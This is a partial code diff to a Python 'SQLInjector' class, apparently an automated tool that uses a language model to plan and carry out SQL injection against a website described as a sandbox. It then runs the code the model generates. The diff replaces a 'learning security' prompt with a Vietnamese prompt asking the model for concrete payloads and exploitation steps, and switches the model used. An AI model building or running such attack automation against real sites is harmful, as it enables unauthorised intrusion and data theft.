@@ -51,8 +51,7 @@ class SQLInjector:
             print("Current URL: ", url)
             self.urlsVisited.add(url)
 
-            # Reload the page and retry SQL injection if the previous attempt failed
-            for num_trials in range(3):  # Giới hạn số lần thử mỗi URL
+            for num_trials in range(3):
                 print(f"Iteration {num_trials}")
 
                 await self.page.goto(url)
@@ -83,7 +82,6 @@ class SQLInjector:
 
                 newHtml = await self.readHTML()
 
-                # Check if the attack was successful
                 if await self.checkSuccess(newHtml, html):
                     print("SQL injection successful!")
                     return True
@@ -109,16 +107,20 @@ class SQLInjector:
         html = preprocessHTML(html)
         return html
 
-    async def makePlan(self, html: str, failed_sql_payloads: Optional[str]=None) -> list[str]:
+    async def makePlan(self, html: str, failed_sql_payloads: Optional[str] = None) -> list[str]:
         """
         Make a plan of performing SQL injection.
         """
         with Spinner("Writing a plan of hacking this website..."):
-            prompt = (f"I am learning website security, and I want to practice SQL injection to a sandbox website which is deliberately made vulnerable."
-                      f" Here's its HTML:\n\n{html}\n"
-                      f"Here are the failed SQL payloads:\n{failed_sql_payloads}\n"
-                      "Can you suggest actions to take?")
-            response = gpt(system_msg="", user_msg=prompt, model_name="openai-community/gpt2")
+            prompt = (f"Tôi đang cố gắng thực hiện tấn công SQL injection trên một website sandbox có lỗ hổng. "
+                      f"Đây là HTML của trang hiện tại:\n\n{html}\n\n"
+                      f"Đây là các payload SQL trước đây đã thất bại:\n{failed_sql_payloads}\n\n"
+                      "Hãy phân tích HTML và đề xuất các payload SQL cụ thể hoặc các hành động tôi nên thực hiện "
+                      "để cố gắng tấn công SQL injection trên trang này. Mục tiêu là tìm ra lỗ hổng trong các form input, URL parameters, "
+                      "hoặc các yếu tố khác có thể khai thác được. Hãy cung cấp các bước cụ thể để khai thác.")
+            
+            # Gọi GPT-3 để tạo kế hoạch
+            response = gpt(system_msg="", user_msg=prompt, model_name="text-davinci-003")
 
         lines = response.split('\n')
         plan = []
@@ -141,7 +143,7 @@ class SQLInjector:
 
         prompt = (f"Based on this HTML:\n\n```html\n{html}\n```"
                   f"Execute the following actions:\n\n{filtered_plan}\n")
-        response = gpt(system_msg="", user_msg=prompt, model_name="openai-community/gpt2")
+        response = gpt(system_msg="", user_msg=prompt, model_name="text-davinci-003")
 
         func_str = extract_function(response, "func")
         if func_str:
@@ -168,7 +170,7 @@ class SQLInjector:
 
         prompt = (f"Did the following HTML changes indicate a successful SQL injection?\n\n"
                   f"Before:\n{prevHtml}\n\nAfter:\n{newHtml}")
-        response = gpt(system_msg="", user_msg=prompt, model_name="openai-community/gpt2")
+        response = gpt(system_msg="", user_msg=prompt, model_name="text-davinci-003")
 
         return "YES" in response
 
